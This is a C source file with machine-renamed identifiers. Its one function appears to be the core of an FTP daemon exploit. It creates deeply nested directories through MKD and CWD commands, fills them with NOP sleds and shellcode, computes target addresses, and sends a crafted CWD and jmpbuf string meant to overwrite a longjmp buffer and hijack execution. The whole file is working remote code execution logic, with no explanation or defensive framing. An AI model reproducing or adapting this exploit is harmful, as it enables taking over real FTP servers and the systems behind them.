
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_6__ TYPE_3__ ;
typedef struct TYPE_5__ TYPE_2__ ;
typedef struct TYPE_4__ TYPE_1__ ;


struct TYPE_6__ {int pwdlen; } ;
struct TYPE_5__ {int maxpathlen; int mapped_path; int errcatch; scalar_t__ pad_eax; } ;
struct TYPE_4__ {char* rev; char* user; char* pass; int dirlen; } ;


 int VAR_0 ;
 int VAR_1 ;
 int FUNC_0 (int ,char*) ;
 int FUNC_1 () ;
 int FUNC_2 () ;
 TYPE_3__ VAR_2 ;
 char* FUNC_3 (int) ;
 int FUNC_4 (int ,char*,int) ;
 int FUNC_5 (char*,int,int) ;
 int FUNC_6 (char*,...) ;
 int FUNC_7 (char*,char*) ;
 char* VAR_3 ;
 TYPE_2__* VAR_4 ;
 int FUNC_8 (char*,char*) ;
 int FUNC_9 (char*) ;
 scalar_t__ FUNC_10 (char*,char*,int) ;
 TYPE_1__ VAR_5 ;

int
FUNC_11 (void)
{
    int VAR_6,
        VAR_7,
        VAR_8;
    int VAR_9,
        VAR_10,
        VAR_11;
    int VAR_12, VAR_13;
    char VAR_14[2048];

    VAR_10 = FUNC_9 ("ftpd: ");
    VAR_10 += FUNC_9 (VAR_5.rev);
    VAR_10 += FUNC_9 (": ");
    VAR_10 += FUNC_9 (VAR_5.user);
    VAR_10 += FUNC_9 (": ");

    if (FUNC_10 ("anonymous", VAR_5.user, 9) == 0)
        VAR_10 += FUNC_9 (VAR_5.pass) + 1;

    VAR_7 = (VAR_4->maxpathlen-VAR_2.pwdlen) / (VAR_5.dirlen + 1);

    VAR_8 = VAR_4->maxpathlen-VAR_2.pwdlen - (VAR_5.dirlen + 1) * VAR_7;

    if (VAR_0 > 0) {
        FUNC_6 ("CWD %d + (dirlen %d * %d times) + fill %d = %d\n",
                VAR_2.pwdlen, VAR_5.dirlen, VAR_7, VAR_8, VAR_4->maxpathlen);
    }

    if (FUNC_9 (VAR_3) > (VAR_5.dirlen - 40))
        FUNC_0(0, "shellcode too big, edit the source to use less padding,"
                "\nhmm.. this shouldn't have happened with LaM3rZ shellcode!");


    VAR_6 = VAR_4->mapped_path + VAR_2.pwdlen
                            + ( (VAR_5.dirlen - FUNC_9(VAR_3)) / 2);

    if (VAR_0 > 0)
        FUNC_6 ("will try to longjmp to 0x%x\n", VAR_6);

    VAR_9 = VAR_4->errcatch - VAR_10;
    VAR_11 = VAR_4->errcatch + (6 * 4) + 2 + 8;

    if (VAR_0 > 0) {
        FUNC_6 ("errcatch(0x%x) - argvlen(%d) = start 0x%x - end 0x%x\n",
                VAR_4->errcatch, VAR_10, VAR_9, VAR_11);
    }

    FUNC_5 (VAR_14, 'A', VAR_5.dirlen);

    if (VAR_0<3)
        VAR_1 = 0;
    for (VAR_12 = 0; VAR_12 < VAR_7; VAR_12++) {
            switch (VAR_12) {
            case 0: FUNC_5 (VAR_14, 0x90, VAR_5.dirlen);
                    FUNC_4 (VAR_14+VAR_5.dirlen-FUNC_9(VAR_3),
                            VAR_3, FUNC_9 (VAR_3));
                    break;
            case 1: FUNC_5 (VAR_14, 0x90, VAR_5.dirlen); break;
            default:
                    break;
            }

            VAR_14[VAR_5.dirlen] = 0;
            FUNC_7 ("MKD %s\n", VAR_14);
            FUNC_1 ();

            FUNC_7 ("CWD %s\n", VAR_14);
            FUNC_1 ();
    }

    FUNC_2 ();
    VAR_1 = 1;

    if (VAR_0 > 0)
        FUNC_6 ("Now %d bytes deep in dir structure.\n", VAR_2.pwdlen);

    if (VAR_8 != VAR_4->maxpathlen-VAR_2.pwdlen)
        FUNC_0 (0, "Calculation wrong. Error!");

    if (VAR_8 > 506)
        FUNC_0 (0, "Aw.. fuck! My fill is waaaay to big!\n");


    VAR_8 += VAR_4->pad_eax ? 12 : 8;

    VAR_13 = VAR_8/4;
    VAR_14[0] = 0;
    for (VAR_12=0; VAR_12 < VAR_13; VAR_12++)
        FUNC_8(VAR_14, FUNC_3(VAR_9));
    for (VAR_12=1; VAR_12 < (VAR_8 - (VAR_13*4)); VAR_12++)
        FUNC_8(VAR_14, "A");


    FUNC_8 (VAR_14, FUNC_3 (VAR_4->mapped_path+VAR_2.pwdlen+13));
    FUNC_8 (VAR_14, FUNC_3 (VAR_11));

    if (VAR_0 > 0)
            FUNC_6 ("Sending final CWD\n");

    if (FUNC_9 (VAR_14) < 20)
    FUNC_0 (0, "cwd string too short.. check for 0x0's.\n");

    FUNC_7 ("CWD %s\n", VAR_14);
    FUNC_1 ();



    if (VAR_0 > 0)
            FUNC_6 ("Sending jmpbuf\n");

    VAR_14[0] = 0;
    for (VAR_12=0; VAR_12<8; VAR_12++)
        FUNC_8 (VAR_14, FUNC_3 (VAR_6));

    if (FUNC_9 (VAR_14) != 32)
            FUNC_0 (0, "jmpbuf string too short.. check for 0x0's.\n");

    FUNC_7 ("%s\n", VAR_14);

    FUNC_1 ();

    return (1);
}
